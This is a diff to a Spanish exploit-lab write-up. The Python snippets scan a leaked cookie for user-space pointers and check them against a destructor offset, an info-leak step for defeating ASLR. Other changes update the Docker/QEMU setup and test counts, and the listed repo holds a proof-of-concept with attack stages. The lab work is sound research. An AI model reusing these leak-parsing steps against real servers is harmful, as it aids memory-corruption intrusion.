@@ -187,9 +187,15 @@ El parser decodifica la cookie, recorre ventanas de 8 bytes y se queda con los
 valores que parecen punteros de usuario:
 
 ```python
+# Ventana clásica de 47 bits y ventana alta de paginación de 5 niveles.
+WINDOWS = ((0x7F0000000000, 0x800000000000), (1 << 55, 1 << 56))
+
+def is_user_pointer(v):
+    return any(lo <= v < hi for lo, hi in WINDOWS)
+
 for i in range(len(raw) - 8):
     v = int.from_bytes(raw[i:i + 8], "little")
-    if 0x7F0000000000 <= v < 0x800000000000:
+    if is_user_pointer(v):
         counts[v & ~0x1FFFFF] += 1
 ```
 
@@ -223,7 +229,7 @@ La validación es deliberadamente estricta:
 
 ```python
 p = int.from_bytes(raw[8:16], "little")
-if not (0x7F0000000000 <= p < 0x800000000000):
+if not is_user_pointer(p):         # ventanas 47/56 bits
     return 0
 if p & 0xFFF != dtor_offset & 0xFFF:
     return 0
@@ -518,8 +524,20 @@ proof y el parcheado no.
 
 ## 13. Reproducibilidad
 
-Requisitos: Docker con daemon, Python 3.9+, y en Apple Silicon emulación
-`linux/amd64`.
+Requisitos: Docker Engine/Desktop con el plugin Compose v2 y Python 3.9+.
+En Linux x86_64 funciona de forma nativa; en Linux arm64 hace falta
+binfmt/QEMU para `linux/amd64`:
+
+```sh
+docker run --privileged --rm tonistiigi/binfmt --install amd64
+```
+
+En macOS arm64, Docker Desktop incluye la emulación. En Fedora/RHEL con
+SELinux enforcing, los bind mounts pueden necesitar `:z`.
+
+El laboratorio de este artículo se ejecutó en macOS arm64 con Docker Desktop.
+En un host Linux no se ha probado todavía; los puntos anteriores son los
+requisitos que hay que cubrir.
 
 ```sh
 git clone <repo>
@@ -535,7 +553,7 @@ make matrix
 make lab-down
 ```
 
-La suite tiene 67 tests y no necesita Docker:
+La suite tiene 72 tests y no necesita Docker:
 
 ```sh
 make check
@@ -547,7 +565,7 @@ El repositorio incluye:
 docker/       compose, ini, Apache, entrypoint, index.php
 poc/          cliente HTTP, offsets ELF, perfiles, etapas, CLI, detección
 profiles/     bookworm.json, lab.json
-tests/        67 tests stdlib
+tests/        72 tests stdlib
 docs/         laboratorio, arquitectura, etapas, resultados, este blog
 runtime/      flag sintética y proofs (ignorado)
 results/      matrices JSON (ignorado)
